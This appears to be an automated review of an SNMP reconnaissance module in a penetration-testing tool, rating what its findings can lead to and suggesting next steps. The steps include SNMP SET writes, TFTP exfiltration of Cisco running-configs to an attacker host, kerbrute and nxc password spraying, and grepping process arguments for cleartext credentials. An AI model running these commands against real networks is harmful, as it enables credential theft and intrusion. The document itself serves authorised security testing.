summary: Excellent T1 coverage — every finding is a real read that succeeds only when a community works. snmp_community/snmp_rw already push toward T2/T3 by leaking actionable data (Windows users -> Account rows for spray; ARP/routes -> new host discovery). Never sends a SET (correctly, per user directive). Biggest gap: the RW-likely community is only inferred by name — no actual proof of write, and Cisco config-copy (running-config exfil) is only in the runbook, not automated. SNMPv3 engine discovery is present but doesn't attempt username enumeration for offline hash cracking.

findings.title_pattern: SNMP readable with a guessable community string
findings.tier_evidence: Community only marked found when sysDescr GET returns a real value under it — deterministic per-community.
findings.promotion_notes: Chain into the RW check via harmless SET on sysContact.0 (writes a canary string, then reads it back, restores original). Only fires with --active-writes flag. Also consume all users/interfaces into shared_users/os_fingerprints surfaces.
findings.tester_next_step: snmpwalk -v2c -c <community> <ip> .1 > loot/snmp-<ip>.walk; python3 -c 'import re; [print(x) for x in open("loot/snmp-<ip>.walk").read() if "passwd" in x.lower()]'.

findings.title_pattern: SNMP readable with a guessable community string (RW-likely)
findings.tier_evidence: Community-name heuristic — recce does NOT actually verify write. True T2 requires SET.
findings.promotion_notes: Add an opt-in SET-canary probe on sysContact.0 (read original, SET canary, read back, restore) — proves RW without destroying config. On Cisco, chain the config-copy MIB (1.3.6.1.4.1.9.9.96) TFTP-exfil the running-config with a listener recce ships (contains creds/keys => T3).
findings.tester_next_step: snmpset -v2c -c <community> <ip> 1.3.6.1.2.1.1.4.0 s 'recce-canary'; then Cisco: python3 -m pysnmp.tools --config-copy tftp://<attacker-ip>/run.cfg — running-config lands with 'enable secret' hashes.

findings.tier_evidence: Actual Windows LanManager user names extracted from live MIB walk and materialized as Account objects — pre-cred capture.
findings.promotion_notes: Auto-hand the user list to the SMB spray + kerbrute preauth check. First cred landing => T3 initial access.
findings.tester_next_step: kerbrute passwordspray -d <domain> --dc <dc> loot/snmp-users.txt 'Winter2024!'; nxc smb <all_hosts> -u loot/snmp-users.txt -p 'Password1' --continue-on-success.

findings.tier_evidence: hrSWRun + hrSWInstalled walked and returned — proves the view is open.
findings.promotion_notes: Also walk hrSWRunPerf/hrSWRunParameters (already _HR_SW_RUN_PARAMS constant exists but is unused!) — command-line args often carry cleartext credentials (mysql -p<pw>, curl -u user:pw); helper _cmdline_looks_credful() is already defined but never called. Wire that in for real T2 credential capture.
findings.tester_next_step: snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.25.4.2.1.5  # hrSWRunParameters; grep -iE 'password=|-p |mysql|curl -u' — often finds real creds.

findings.title_pattern: SNMP exposes the ARP cache (internal host discovery)
findings.tier_evidence: Live ARP table with MAC pairs pulled — 'fresh' IPs compared against engagement host list.
findings.promotion_notes: Auto-add fresh IPs to shared known_hosts + trigger a rescan pass targeting them. MAC OUI lookup for hardware fingerprinting (iLO/iDRAC/VMware/OT).
findings.tester_next_step: snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.4.22.1.2; feed IPs into nmap: nmap -Pn -sS -T4 --top-ports 1000 <fresh_ips>.

findings.title_pattern: SNMP exposes the routing table (internal network map)
findings.tier_evidence: ipRouteTable / ipCidrRouteTable actively walked and rows returned.
findings.promotion_notes: Auto-ingest destination networks into shared known_networks surface — feeds host-discovery expansion pass. Also gate a follow-on 'route-injection possible' check when combined with snmp_rw.
